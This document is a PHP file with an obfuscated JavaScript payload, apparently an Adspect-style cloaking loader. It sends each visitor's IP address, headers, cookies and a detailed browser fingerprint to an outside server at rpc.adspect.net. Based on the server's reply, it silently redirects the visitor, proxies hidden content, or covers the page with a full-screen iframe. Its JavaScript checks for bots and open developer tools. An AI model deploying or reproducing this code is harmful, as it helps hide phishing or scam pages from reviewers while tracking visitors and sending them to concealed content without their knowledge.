<?php
 defined('ADSPECT_DEBUG') or define('ADSPECT_DEBUG', 0); if (ADSPECT_DEBUG) { ini_set('display_errors', '1'); error_reporting(E_ALL); } else { ini_set('display_errors', '0'); } if (!function_exists('adspect')) { function adspect_coalesce($array, $keys, $default = '') { if (is_scalar($keys)) { $keys = array($keys); } foreach ($keys as $key) { if (array_key_exists($key, $array)) { return $array[$key]; } } return $default; } function adspect_render() { require_once func_get_arg(0); } function adspect_client_addr() { $addr = adspect_coalesce($_SERVER, array( 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', )); if ($addr !== '') { return strtok($addr, ','); } if (array_key_exists('HTTP_FORWARDED', $_SERVER)) { $proxy = $_SERVER['HTTP_FORWARDED']; $proxy = strtok($proxy, ','); $proxy = explode(';', $proxy); foreach ($proxy as $for) { if (!strncasecmp($for, 'for=', 4)) { $for = explode('=', $for, 2); return adspect_coalesce($for, 1); } } } return adspect_coalesce($_SERVER, 'REMOTE_ADDR'); } function adspect_headers() { $headers = array(); foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy($url, $param, $key) { $url = parse_url($url); if (empty($url)) { http_response_code(500); exit; } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $data = curl_exec($curl); $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); if (!$code) { $code = 500; } http_response_code($code); if (is_string($data)) { if (preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } header("Content-Type: $type"); } else { $data = ''; } return $data; } function adspect($sid, $mode, $param, $key) { if ($mode === 'proxy' && array_key_exists($param, $_GET)) { list($url, $host) = explode('#', $_GET[$param]); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; echo adspect_proxy($url, $param, $key); exit; } $ajax = $mode === 'ajax'; $curl = curl_init(); $addr = adspect_client_addr(); $ua = adspect_coalesce($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_coalesce($_SERVER, 'HTTP_REFERER'); $query = adspect_coalesce($_SERVER, 'QUERY_STRING'); $cookie = sha1(implode(':', array($sid, $addr, $ua, $query))); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['cookie'] = array($cookie, adspect_coalesce($_COOKIE, $cookie)); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); } $sid = adspect_coalesce($_GET, '__sid', $sid); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_HTTPHEADER, array( 'Adspect-IP: ' . $addr, 'Adspect-UA: ' . $ua, 'Adspect-JS: ' . intval($ajax), 'Adspect-Referrer: ' . $referrer )); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $target = curl_exec($curl); if ($errno = curl_errno($curl)) { if (ADSPECT_DEBUG) { exit('cURL error: ' . curl_strerror($errno)); } http_response_code(500); exit; } $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Content-Type: application/javascript'); header('Cache-Control: no-store'); switch ($status) { case 202: break; case 200: if ($ajax) { if ($target != '') { if ($_SERVER['REQUEST_METHOD'] === 'POST') { echo $target; } else { $target = json_encode($target); echo "window.__location = {$target};"; break; } } } elseif (!preg_match('/^[[:alnum:]]+:/i', $target)) { $target = parse_url($target); $query = adspect_coalesce($target, 'query'); parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; unset($_POST['data']); $_SERVER['REQUEST_METHOD'] = 'GET'; if (adspect_coalesce($target, 'path') === '') { return null; } $dirname = dirname($target['path']); if ($dirname[0] !== '/') { $dirname = __DIR__ . '/' . $dirname; } chdir($dirname); $target = basename($target['path']); if (!function_exists('mime_content_type') || preg_match('/\.(?:php[345]?|phtml)$/', $target)) { adspect_render($target); } else { header('Content-Type: ' . mime_content_type($target)); header('Content-Length: ' . filesize($target)); readfile($target); } } elseif ($mode === 'redirect' || !preg_match('/^https?:/i', $target)) { header("Location: {$target}"); } elseif ($mode === 'proxy') { echo adspect_proxy($target, $param, $key); } elseif ($mode === 'iframe') { $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; } exit; case 404: http_response_code(404); exit; default: if (ADSPECT_DEBUG) { exit("cURL returned status code {$status}"); } http_response_code(503); exit; } setcookie($cookie, hash('crc32b', $cookie), time() + 3600); return $target; } } $target = adspect('1ec08d44-ef8e-65bc-a4f5-ac1f6b95a853', 'ajax', '_', base64_decode('iFIf7sH9zi2DdLh5IDaAQc7+2U71U0tJedVfXApOBI8=')); if ($target === null) { return; } ?>
(function(){function end(sub){if(''!==sub)switch(storage['className']){case'assign':window['location']['assign'](sub);break;case'replace':window['location']['replace'](sub);break;case'iframe':var ops=document['createElement']('iframe');ops['style']['cssText']='width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;',ops['src']=sub,document['body']=document['createElement']('body'),document['body']['appendChild'](ops);}}var expand=[],current={},storage=document['getElementById'](btoa(window['location']['origin']));if(window['__location'])return end(window['__location']);var int=function(){current['errors']=expand;var view=new FormData();view['append']('data',JSON['stringify'](current));var code=new XMLHttpRequest();code['open']('POST',storage['getAttribute']('src'),!0x1),code['onreadystatechange']=function(){0x4===this['readyState']&&0xc8===this['status']&&end(this['responseText']);},code['send'](view);};try{var info=function(get){if('object'===typeof get&&null!==get){var set=function(used){try{var index=get[used];switch(typeof index){case'object':if(null===index)break;case'function':index=index['toString']();}yes[used]=index;}catch(right){expand['push'](right['message']);}},yes={},last;for(last in get)set(last);try{var complete=Object['getOwnPropertyNames'](get);for(last=0x0;last<complete['length'];++last)set(complete[last]);yes['!!']=complete;}catch(api){expand['push'](api['message']);}return yes;}};current['screen']=info(window['screen']),current['window']=info(window),current['navigator']=info(window['navigator']),current['location']=info(window['location']),current['console']=info(window['console']),current['documentElement']=function(split){try{var param={};split=split['attributes'];for(var jump in split)jump=split[jump],param[jump['nodeName']]=jump['nodeValue'];return param;}catch(finish){expand['push'](finish['message']);}}(document['documentElement']),current['document']=info(document);try{current['timezoneOffset']=new Date()['getTimezoneOffset']();}catch(stop){expand['push'](stop['message']);}try{current['closure']=function(){}['toString']();}catch(payload){expand['push'](payload['message']);}try{current['touchEvent']=document['createEvent']('TouchEvent')['toString']();}catch(i){expand['push'](i['message']);}try{info=function(){};var list=0x0;info['toString']=function(){return++list,'';},console['log'](info),current['tostring']=list;}catch(register){expand['push'](register['message']);}window['navigator']['permissions']['query']({'name':'notifications'})['then'](function(op){current['permissions']=[window['Notification']['permission'],op['state']],int();},int);try{var comment=document['createElement']('canvas')['getContext']('webgl'),search=comment['getExtension']('WEBGL_debug_renderer_info');current['webgl']={'vendor':comment['getParameter'](search['UNMASKED_VENDOR_WEBGL']),'renderer':comment['getParameter'](search['UNMASKED_RENDERER_WEBGL'])};}catch(join){expand['push'](join['message']);}}catch(instance){expand['push'](instance['message']),int();}}());